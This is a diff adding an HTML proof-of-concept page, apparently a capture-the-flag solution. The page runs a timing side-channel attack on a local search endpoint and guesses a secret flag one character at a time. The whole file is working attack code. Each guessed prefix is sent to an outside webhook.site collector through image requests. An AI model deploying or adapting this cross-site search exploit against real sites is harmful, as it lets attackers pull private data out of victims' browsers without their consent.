@@ -1,0 +1,93 @@
+<!DOCTYPE html><meta charset="utf-8" /><title>Slow Search PoC</title>
+<script>
+  ;(async () => {
+    const target = 'http://127.0.0.1:12002/search?query='
+    const report =
+      'https://webhook.site/e08792fc-b741-4959-8905-ac52166ed798/hit'
+    const alphabet =
+      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'
+    let prefix = 'scpCTF{'
+    const MAX_LEN = 26 // 7 + 18 + 1
+
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
+    const measure = async (q) => {
+      const t0 = performance.now()
+      try {
+        await fetch(target + encodeURIComponent(q), {
+          mode: 'no-cors',
+          cache: 'no-store',
+        })
+      } catch (e) {}
+      return performance.now() - t0
+    }
+    const decide = async (q, tries = 3) => {
+      const arr = []
+      for (let i = 0; i < tries; i++) {
+        arr.push(await measure(q))
+        await sleep(120)
+      }
+      arr.sort((a, b) => a - b)
+      // 중앙값 사용
+      return arr[Math.floor(arr.length / 2)]
+    }
+
+    // 0) baseline 측정 → threshold 자동 설정
+    const baseSamples = []
+    for (let i = 0; i < 5; i++) {
+      baseSamples.push(
+        await measure('zzz' + Math.random().toString(36).slice(2, 8))
+      )
+      await sleep(120)
+    }
+    const base = baseSamples.reduce((a, b) => a + b, 0) / baseSamples.length // 평균
+    let threshold = base + 1800 // 평균 + 1.8s (환경 따라 1.6~2.2s 조정)
+    console.log(
+      '[baseline]',
+      Math.round(base),
+      'ms',
+      'threshold=',
+      Math.round(threshold),
+      'ms'
+    )
+
+    while (prefix.length < MAX_LEN) {
+      // 1) '}'로 완성 시도
+      {
+        const guess = prefix + '}'
+        const dt = await decide(guess)
+        if (dt > threshold) {
+          new Image().src = `${report}?flag=${encodeURIComponent(
+            guess
+          )}&t=${Math.round(dt)}`
+          return
+        }
+        await sleep(150)
+      }
+
+      // 2) 본문 한 글자씩
+      let found = false
+      for (const ch of alphabet) {
+        const guess = prefix + ch
+        const dt = await decide(guess)
+        if (dt > threshold) {
+          prefix = guess
+          new Image().src = `${report}?hit=${encodeURIComponent(
+            guess
+          )}&t=${Math.round(dt)}`
+          console.log('[HIT]', guess, Math.round(dt), 'ms')
+          found = true
+          break
+        }
+        await sleep(120)
+      }
+      if (!found) {
+        // 잡음 크면 threshold를 소폭 상향
+        threshold += 100
+        await sleep(600)
+      }
+    }
+  })()
+</script>
+<body>
+  PoC running…
+</body>
